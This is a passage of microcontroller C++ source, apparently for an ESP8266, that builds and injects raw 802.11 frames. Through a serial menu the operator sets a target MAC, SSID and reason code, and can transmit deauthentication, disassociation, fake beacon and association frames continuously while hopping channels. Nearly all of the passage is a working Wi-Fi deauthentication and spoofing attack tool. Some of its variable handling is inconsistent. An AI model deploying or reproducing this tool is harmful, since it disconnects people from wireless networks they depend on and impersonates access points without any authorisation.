  else if (selected_frame == FRAME_DEAUTH) tx_buf = aligned_deauth_buffer;
  else if (selected_frame == FRAME_DISASSOC) tx_buf = aligned_disassoc_buffer;
  tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);

  if (tx_result) {
    Serial.println("Transmission successful!");
  } else {
    Serial.println("Transmission failed! Error in packet structure or hardware access.");
    Serial.println("Try adjusting packet structure according to IEEE 802.11 standard.");
  }

  Serial.println("\nAvailable commands:");
  Serial.println("t - Trigger manual transmission");
  Serial.println("c - Toggle continuous mode");
  Serial.println("d - Toggle debug mode");
  Serial.println("h - Show this help");
  Serial.println("s - Show current status");
  Serial.println("1-9 - Set WiFi channel");
  Serial.println("m - Change target MAC address");
  Serial.println("f - Select frame type");
  Serial.println("n - Set SSID");
  Serial.println("r - Set reason code (deauth/disassoc)");
}

void loop() {
  static unsigned long last_tx = 0;
  static unsigned long last_hop = 0;
  static uint8_t current_channel = 1;
  static bool continuous_mode = false;
  unsigned long now = millis();
  
  // Update channel hopping strategy based on conditions
  update_channel_strategy();
  // Channel hopping timing
  if (now - last_hop >= DWELL_TIME) {
    bool clear_channel = perform_channel_hop(wifi_channel);
    last_hop = now;
    
    if (debug_mode) {
      Serial.printf("Hopped to channel %d (Channel %s)\n", 
                   wifi_channel,
                   clear_channel ? "clear" : "busy");
    }
  }
  
  // Handle continuous transmission mode
  if (continuous_mode && (now - last_tx > CHANNEL_SWITCH_DELAY)) {
    if (!check_hardware_ready()) {
      Serial.println("Hardware busy, skipping transmission");
      return;
    }
      // Attempt transmission with retries and backoff
    bool tx_result = attempt_transmission(current_channel);
    
    if (debug_mode) {
        Serial.printf("Transmission attempt on channel %d: %s\n", 
                     current_channel,
                     tx_result ? "SUCCESS" : "FAILED");
        Serial.printf("Channel stats - Fails: %d, Busy: %d, Blacklisted: %s\n",
                     channel_stats[current_channel].fail_count,
                     channel_stats[current_channel].busy_count,
                     channel_stats[current_channel].blacklisted ? "Yes" : "No");
    }
    
    int status = tx_result ? 0 : 1;
    Serial.printf("Transmission %s: %s\n", 
                 tx_result ? "successful" : "failed",
                 get_tx_status_string(status));
      if (debug_mode && tx_result) {
      uint16_t dbg_packet_size = 0;
      switch (selected_frame) {
        case FRAME_BEACON:
          dbg_packet_size = build_beacon_packet(aligned_beacon_buffer, source_mac, ssid, current_channel);
          print_packet_details(aligned_beacon_buffer, dbg_packet_size);
          break;
        case FRAME_DEAUTH:
          dbg_packet_size = build_deauth_packet(aligned_deauth_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(aligned_deauth_buffer, dbg_packet_size);
          break;
        case FRAME_DISASSOC:
          dbg_packet_size = build_disassoc_packet(aligned_disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
          print_packet_details(aligned_disassoc_buffer, dbg_packet_size);
          break;
        default:
          dbg_packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, current_channel);
          print_packet_details(aligned_packet_buffer, dbg_packet_size);
          break;
      }
    }
    
    // Channel hopping
    channel_scan = next_channel(channel_scan);
    last_tx = now;
  }
  
  // Handle serial commands
  if (Serial.available()) {
    char cmd = Serial.read();
    uint16_t packet_size = 0;
    
    // Frame type selection helper
    auto select_frame_type = [&]() {
      Serial.println("Select frame type:");
      Serial.println("0 - Association Request");
      Serial.println("1 - Beacon");
      Serial.println("2 - Deauthentication");
      Serial.println("3 - Disassociation");
      while (!Serial.available());
      char ftype = Serial.read();
      if (ftype >= '0' && ftype <= '3') {
        selected_frame = (FrameType)(ftype - '0');
        Serial.printf("Frame type set to %d\n", selected_frame);
      } else {
        Serial.println("Invalid frame type");
      }
    };
    
    switch(cmd) {
      case 't': // Trigger single transmission
        {
          Serial.println("Manual transmission triggered");
          if (!check_hardware_ready()) {
            Serial.println("Hardware busy, please wait");
            break;
          }
          uint16_t packet_size = 0;
          uint8_t* tx_buf = aligned_packet_buffer;
          switch (selected_frame) {
            case FRAME_ASSOC_REQ:
              packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, wifi_channel);
              tx_buf = aligned_packet_buffer;
              break;
            case FRAME_BEACON:
              packet_size = build_beacon_packet(aligned_beacon_buffer, source_mac, ssid, wifi_channel);
              tx_buf = aligned_beacon_buffer;
              break;
            case FRAME_DEAUTH:
              packet_size = build_deauth_packet(aligned_deauth_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = aligned_deauth_buffer;
              break;
            case FRAME_DISASSOC:
              packet_size = build_disassoc_packet(aligned_disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
              tx_buf = aligned_disassoc_buffer;
              break;
            default:
              packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, wifi_channel);
              tx_buf = aligned_packet_buffer;
              break;
          }
          bool tx_result = transmit_raw_packet(tx_buf, packet_size, 2, wifi_channel);
          Serial.printf("Transmission %s\n", tx_result ? "successful" : "failed");
          if (debug_mode) print_packet_details(tx_buf, packet_size);
        }
        break;

      case 'c': // Toggle continuous mode
        continuous_mode = !continuous_mode;
        Serial.printf("Continuous mode: %s\n", continuous_mode ? "ON" : "OFF");
        break;

      case 'd': // Toggle debug mode
        debug_mode = !debug_mode;
        Serial.printf("Debug mode: %s\n", debug_mode ? "ON" : "OFF");
        break;

      case 'h': // Show help
        Serial.println("\nAvailable Commands:");
        Serial.println("t - Trigger single transmission");
        Serial.println("c - Toggle continuous mode");
        Serial.println("d - Toggle debug mode");
        Serial.println("h - Show this help");
        Serial.println("s - Show current status");
        Serial.println("1-9 - Set channel (1-9)");
        Serial.println("m - Set custom MAC address");
        Serial.println("f - Select frame type");
        Serial.println("n - Set SSID");
        Serial.println("r - Set reason code (deauth/disassoc)");
        break;

      case 's': // Show status
        Serial.println("\n=== Current Status ===");
        Serial.printf("Continuous Mode: %s\n", continuous_mode ? "ON" : "OFF");
        Serial.printf("Debug Mode: %s\n", debug_mode ? "ON" : "OFF");
        Serial.printf("Current Channel: %d\n", wifi_channel);
        Serial.printf("Target MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     target_mac[0], target_mac[1], target_mac[2],
                     target_mac[3], target_mac[4], target_mac[5]);
        Serial.printf("Source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     source_mac[0], source_mac[1], source_mac[2],
                     source_mac[3], source_mac[4], source_mac[5]);
        Serial.printf("SSID: %s\n", ssid);
        Serial.printf("Frame Type: %d\n", selected_frame);
        Serial.printf("Reason Code: 0x%04X\n", reason_code);
        Serial.println("===================");
        break;

      case 'm': // Set custom MAC
        if (Serial.available() >= 17) { // Wait for complete MAC (XX:XX:XX:XX:XX:XX)
          char mac_str[18];
          Serial.readBytes(mac_str, 17);
          mac_str[17] = '\0';
          if (parse_mac_address(mac_str, target_mac)) {
            Serial.println("MAC address updated successfully");
          } else {
            Serial.println("Invalid MAC address format");
          }
        }
        break;      case 'f': // Select frame type
        select_frame_type();
        break;

      case 'n': // Set SSID
        Serial.println("Enter new SSID (max 32 chars):");
        while (!Serial.available());
        {
          int len = Serial.readBytesUntil('\n', ssid, 32);
          ssid[len] = '\0';
          Serial.printf("SSID set to: %s\n", ssid);
        }
        break;

      case 'r': // Set reason code
        Serial.println("Enter reason code (hex, e.g. 0001):");
        while (!Serial.available());
        {
          char reason_str[5] = {0};
          int len = Serial.readBytes(reason_str, 4);
          reason_str[4] = '\0';
          unsigned int val = 0;
          sscanf(reason_str, "%x", &val);
          reason_code = (uint16_t)val;
          Serial.printf("Reason code set to: 0x%04X\n", reason_code);
        }
        break;

      default:
        if (cmd >= '1' && cmd <= '9') {
          wifi_channel = cmd - '0';
          Serial.printf("Channel set to %d\n", wifi_channel);
        }
        break;
    }
  }
    // Handle serial buffer and yield CPU
  yield();
}

uint8_t next_channel(uint8_t current_channel) {
    switch (hopping_strategy) {
        case SEQUENTIAL:
            current_channel++;
            if (current_channel > MAX_CHANNEL) {
                current_channel = MIN_CHANNEL;
            }
            break;
            
        case ADAPTIVE: {
            uint8_t attempts = 0;
            do {
                current_channel++;
                if (current_channel > MAX_CHANNEL) {
                    current_channel = MIN_CHANNEL;
                }
                attempts++;
            } while (channel_stats[current_channel].blacklisted && attempts < MAX_CHANNEL);
            break;
        }
        
        case RANDOM:
            do {
                current_channel = MIN_CHANNEL + (os_random() % (MAX_CHANNEL - MIN_CHANNEL + 1));
            } while (channel_stats[current_channel].blacklisted);
            break;
    }
    return current_channel;
}

bool attempt_transmission(uint8_t channel) {
    const uint8_t MAX_RETRIES = 3;
    const uint16_t BACKOFF_BASE_MS = 5;
    uint8_t retry_count = 0;
    bool success = false;

    while (!success && retry_count < MAX_RETRIES) {
        uint16_t packet_size = 0;
        uint8_t* tx_buf = aligned_packet_buffer;

        // Build appropriate packet type
        switch (selected_frame) {
            case FRAME_BEACON:
                packet_size = build_beacon_packet(aligned_beacon_buffer, source_mac, ssid, channel);
                tx_buf = aligned_beacon_buffer;
                break;
            case FRAME_DEAUTH:
                packet_size = build_deauth_packet(aligned_deauth_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buf = aligned_deauth_buffer;
                break;
            case FRAME_DISASSOC:
                packet_size = build_disassoc_packet(aligned_disassoc_buffer, target_mac, source_mac, target_mac, reason_code);
                tx_buf = aligned_disassoc_buffer;
                break;
            default:
                packet_size = build_association_packet(aligned_packet_buffer, target_mac, source_mac, ssid, channel);
                tx_buf = aligned_packet_buffer;
        }

        // Attempt transmission
        success = transmit_raw_packet(tx_buf, packet_size, 2, channel);

        if (!success) {
            retry_count++;
            if (retry_count < MAX_RETRIES) {
                // Exponential backoff
                delay(BACKOFF_BASE_MS * (1 << retry_count));
            }
            channel_stats[channel].fail_count++;
        } else {
            channel_stats[channel].fail_count = 0;
            channel_stats[channel].last_success = millis();
        }
    }

    return success;
}

void initialize_channel_stats() {
    for (uint8_t i = 0; i <= MAX_CHANNEL; i++) {
        channel_stats[i].last_success = 0;
        channel_stats[i].fail_count = 0;
        channel_stats[i].busy_count = 0;
        channel_stats[i].blacklisted = false;
    }
}

void update_channel_strategy() {
    static unsigned long last_update = 0;
    const unsigned long UPDATE_INTERVAL = 1000; // Update strategy every second
    
    if (millis() - last_update < UPDATE_INTERVAL) {
        return;
    }
    
    for (uint8_t i = MIN_CHANNEL; i <= MAX_CHANNEL; i++) {
        // Reset blacklist if channel has been avoided for too long
        if (channel_stats[i].blacklisted && 
            millis() - channel_stats[i].last_success > 30000) { // 30 seconds timeout
            channel_stats[i].blacklisted = false;
            channel_stats[i].fail_count = 0;
            channel_stats[i].busy_count = 0;
        }
        
        // Blacklist channels with high failure rates
        if (channel_stats[i].fail_count > 5 || 
            channel_stats[i].busy_count > 10) {
            channel_stats[i].blacklisted = true;
        }
    }
    
    last_update = millis();
}

bool is_channel_clear(uint8_t channel) {
    // Simple channel energy detection
    if (!wifi_set_channel(channel)) {
        return false;
    }
    
    // Brief delay to let the radio settle
    os_delay_us(500);
    
    // Check the current RSSI level using station API
    int8_t rssi = wifi_station_get_rssi();
    
    // If RSSI is 31, it means no signal or error
    if (rssi == 31) {
        return true;  // Consider no signal as clear channel
    }
    
    // Consider the channel busy if RSSI is above -80dBm
    bool is_clear = (rssi < -80);
    
    if (!is_clear) {
        channel_stats[channel].busy_count++;
    } else {
        channel_stats[channel].busy_count = 0;
    }
    
    return is_clear;
}

bool perform_channel_hop(uint8_t& channel) {
    bool is_clear = is_channel_clear(channel);
    
    if (!is_clear) {
        uint8_t attempts = 0;
        const uint8_t MAX_ATTEMPTS = 5;
        
        while (!is_clear && attempts < MAX_ATTEMPTS) {
            channel = next_channel(channel);
            if (wifi_set_channel(channel)) {
                is_clear = is_channel_clear(channel);
            }
            attempts++;
            delay(1); // Brief delay between attempts
        }
    }
    
    return is_clear;
}